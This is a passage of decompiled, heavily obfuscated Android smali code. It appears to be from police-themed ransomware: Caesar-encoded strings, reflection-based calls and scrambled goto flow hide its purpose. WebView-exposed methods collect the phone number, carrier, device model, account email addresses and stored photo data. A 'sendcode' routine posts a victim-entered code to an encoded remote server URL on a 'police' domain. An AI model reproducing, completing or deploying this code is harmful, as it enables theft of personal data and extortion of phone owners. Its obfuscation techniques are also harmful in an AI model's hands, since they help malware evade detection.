    check-cast v7, Ljava/lang/StringBuilder;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Ljava/lang/String;

    aput-object v12, v10, v9

    aput-object v8, v11, v9

    const-string v9, "append"

    const-class v12, Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v7, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/lang/StringBuilder;

    nop

    goto :goto_3

    :goto_5
    nop

    const-string v8, "-!"

    invoke-static/range {v8 .. v8}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    nop

    goto :goto_5

    :goto_7
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Ljava/lang/Object;

    aput-object v12, v10, v9

    aput-object v2, v11, v9

    const-string v9, "valueOf"

    const-class v12, Ljava/lang/String;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    const/4 v12, 0x0

    invoke-virtual {v9, v12, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/String;

    nop

    goto :goto_6

    :goto_8
    nop

    new-instance v7, Ljava/lang/StringBuilder;

    nop

    goto :goto_7

    :goto_9
    nop

    iget-object v4, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    nop

    goto :goto_8

    :goto_a
    nop

    if-eqz v7, :cond_0

    nop

    goto :goto_9

    :goto_b
    nop

    const/4 v9, 0x0

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const-string v9, "matches"

    const-class v12, Ljava/util/regex/Matcher;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v7, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Ljava/lang/Boolean;

    invoke-virtual {v9}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    nop

    goto :goto_a

    :goto_c
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Ljava/lang/CharSequence;

    aput-object v12, v10, v9

    aput-object v7, v11, v9

    const-string v9, "matcher"

    const-class v12, Ljava/util/regex/Pattern;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v3, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v7

    check-cast v7, Ljava/util/regex/Matcher;

    nop

    goto :goto_b

    :goto_d
    nop

    iget-object v7, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    nop

    goto :goto_c

    :cond_1
    :goto_e
    nop

    aget-object v0, v1, v5

    nop

    goto :goto_d

    :goto_f
    nop

    return-object v2

    nop

    goto :goto_e

    :goto_10
    nop

    if-lt v5, v6, :cond_1

    nop

    goto :goto_f

    :goto_11
    nop

    const/4 v5, 0x0

    nop

    goto :goto_10

    :goto_12
    nop

    array-length v6, v1

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v9, 0x0

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const-string v9, "getAccounts"

    const-class v12, Landroid/accounts/AccountManager;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    invoke-virtual {v9, v5, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, [Landroid/accounts/Account;

    nop

    goto :goto_12

    :goto_14
    nop

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Class;

    new-array v11, v9, [Ljava/lang/Object;

    const/4 v9, 0x0

    const-class v12, Landroid/content/Context;

    aput-object v12, v10, v9

    aput-object v5, v11, v9

    const-string v9, "get"

    const-class v12, Landroid/accounts/AccountManager;

    invoke-virtual {v12, v9, v10}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v9

    const/4 v12, 0x0

    invoke-virtual {v9, v12, v11}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/accounts/AccountManager;

    nop

    goto :goto_13

    :goto_15
    nop

    iget-object v5, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_14

    :goto_16
    nop

    sget-object v3, Landroid/util/Patterns;->EMAIL_ADDRESS:Ljava/util/regex/Pattern;

    nop

    goto :goto_15

    :goto_17
    nop

    const-string v2, ""

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_16

    :goto_18
    nop

    nop
.end method

.method private xmodel()Ljava/lang/String;
    .locals 5
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_2

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->getDeviceName()Ljava/lang/String;

    move-result-object v0

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xnetwork()Ljava/lang/String;
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v2, 0x0

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const-string v2, "getNetworkOperatorName"

    const-class v5, Landroid/telephony/TelephonyManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "qipof"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xphone()Ljava/lang/String;
    .locals 6
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v2, 0x0

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const-string v2, "getLine1Number"

    const-class v5, Landroid/telephony/TelephonyManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    check-cast v0, Landroid/telephony/TelephonyManager;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v1, "qipof"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xphoto()I
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_6

    :goto_0
    nop

    return v0

    nop

    goto :goto_7

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getInt"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v0

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v2, "dbnfsb"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x0

    nop

    goto :goto_5

    :goto_7
    nop

    nop
.end method

.method private xphotoimg()Ljava/lang/String;
    .locals 9
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_7

    :goto_0
    nop

    return-object v0

    nop

    goto :goto_8

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const-string v5, "getString"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    nop

    goto :goto_0

    :goto_2
    nop

    const-string v3, "qipup/kqh"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_1

    :goto_3
    nop

    const-string v2, "gbdf"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v4, 0x0

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_5

    :goto_7
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_6

    :goto_8
    nop

    nop
.end method

.method private xread(Ljava/lang/String;I)I
    .locals 9
    .param p1, "name"    # Ljava/lang/String;
    .param p2, "value"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_5

    :goto_0
    nop

    return v0

    nop

    goto :goto_6

    :goto_1
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object p1, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, p2}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getInt"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Integer;

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v0

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v4, 0x0

    nop

    goto :goto_2

    :goto_4
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_3

    :goto_5
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_4

    :goto_6
    nop

    nop
.end method

.method private xsendcode(Ljava/lang/String;)V
    .locals 12
    .param p1, "code"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto/16 :goto_16

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_17

    :goto_1
    nop

    invoke-virtual {v4, v5}, Lcom/EDzgPz/KwIOuS/VuqHca;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    nop

    goto :goto_0

    :goto_2
    nop

    aput-object v0, v5, v6

    nop

    goto :goto_1

    :goto_3
    nop

    const/4 v6, 0x2

    nop

    goto :goto_2

    :goto_4
    nop

    aput-object v3, v5, v6

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v6, 0x1

    nop

    goto :goto_4

    :goto_6
    nop

    aput-object v6, v5, v7

    nop

    goto :goto_5

    :goto_7
    nop

    const-string v6, "iuuq;00qpsopqpmjdfvtb/dpn0bqj0bqq/qiq"

    invoke-static/range {v6 .. v6}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    nop

    goto :goto_6

    :goto_8
    nop

    new-array v5, v5, [Ljava/lang/String;

    nop

    goto :goto_7

    :goto_9
    nop

    const/4 v5, 0x3

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-direct {v4, v5}, Lcom/EDzgPz/KwIOuS/VuqHca;-><init>(Landroid/content/Context;)V

    nop

    goto :goto_9

    :goto_b
    nop

    iget-object v5, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_a

    :goto_c
    nop

    new-instance v4, Lcom/EDzgPz/KwIOuS/VuqHca;

    nop

    goto :goto_b

    :goto_d
    nop

    move-object v0, p1

    nop

    goto :goto_c

    :goto_e
    nop

    const-string v3, "dpef"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_d

    :goto_f
    nop

    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const-string v8, "commit"

    const-class v11, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v1, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Ljava/lang/Boolean;

    invoke-virtual {v8}, Ljava/lang/Boolean;->booleanValue()Z

    nop

    goto :goto_e

    :goto_10
    nop

    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object v4, v10, v8

    const/4 v8, 0x1

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object p1, v10, v8

    const-string v8, "putString"

    const-class v11, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v1, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_f

    :goto_11
    nop

    const-string v4, "qdpef"

    invoke-static/range {v4 .. v4}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    nop

    goto :goto_10

    :goto_12
    nop

    const/4 v8, 0x0

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const-string v8, "edit"

    const-class v11, Landroid/content/SharedPreferences;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v2, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_11

    :goto_13
    nop

    const/4 v8, 0x2

    new-array v9, v8, [Ljava/lang/Class;

    new-array v10, v8, [Ljava/lang/Object;

    const/4 v8, 0x0

    const-class v11, Ljava/lang/String;

    aput-object v11, v9, v8

    aput-object v5, v10, v8

    const/4 v8, 0x1

    sget-object v11, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v11, v9, v8

    new-instance v11, Ljava/lang/Integer;

    invoke-direct {v11, v7}, Ljava/lang/Integer;-><init>(I)V

    aput-object v11, v10, v8

    const-string v8, "getSharedPreferences"

    const-class v11, Landroid/content/Context;

    invoke-virtual {v11, v8, v9}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v8

    invoke-virtual {v8, v4, v10}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/SharedPreferences;

    nop

    goto :goto_12

    :goto_14
    nop

    const-string v5, "dpdpo"

    invoke-static/range {v5 .. v5}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    nop

    goto :goto_13

    :goto_15
    nop

    iget-object v4, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_14

    :goto_16
    nop

    const/4 v7, 0x0

    nop

    goto :goto_15

    :goto_17
    nop

    nop
.end method

.method private xsetstatus(I)V
    .locals 9
    .param p1, "val"    # I
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto/16 :goto_8

    :goto_0
    nop

    return-void

    nop

    goto/16 :goto_9

    :goto_1
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "commit"

    const-class v8, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/lang/Boolean;

    invoke-virtual {v5}, Ljava/lang/Boolean;->booleanValue()Z

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v2, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, p1}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "putInt"

    const-class v8, Landroid/content/SharedPreferences$Editor;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v0, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1

    :goto_3
    nop

    const-string v2, "tubuvt"

    invoke-static/range {v2 .. v2}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v5, 0x0

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const-string v5, "edit"

    const-class v8, Landroid/content/SharedPreferences;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v1, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/content/SharedPreferences$Editor;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v5, 0x2

    new-array v6, v5, [Ljava/lang/Class;

    new-array v7, v5, [Ljava/lang/Object;

    const/4 v5, 0x0

    const-class v8, Ljava/lang/String;

    aput-object v8, v6, v5

    aput-object v3, v7, v5

    const/4 v5, 0x1

    sget-object v8, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v8, v6, v5

    new-instance v8, Ljava/lang/Integer;

    invoke-direct {v8, v4}, Ljava/lang/Integer;-><init>(I)V

    aput-object v8, v7, v5

    const-string v5, "getSharedPreferences"

    const-class v8, Landroid/content/Context;

    invoke-virtual {v8, v5, v6}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v5

    invoke-virtual {v5, v2, v7}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/SharedPreferences;

    nop

    goto :goto_4

    :goto_6
    nop

    const/4 v4, 0x0

    nop

    goto :goto_5

    :goto_7
    nop

    const-string v3, "dpdpo"

    invoke-static/range {v3 .. v3}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    nop

    goto :goto_6

    :goto_8
    nop

    iget-object v2, p0, Lcom/EDzgPz/KwIOuS/lvjaxn$cVRxjn;->mContext:Landroid/content/Context;

    nop

    goto :goto_7

    :goto_9
    nop

    nop
.end method

.method private xshowToast(Ljava/lang/String;)V
    .locals 6
    .param p1, "toast"    # Ljava/lang/String;
    .annotation runtime Landroid/webkit/JavascriptInterface;
    .end annotation

    .prologue
    nop

    goto :goto_4

    :goto_0
    nop

    return-void

    nop

    goto :goto_5

    :goto_1
    nop
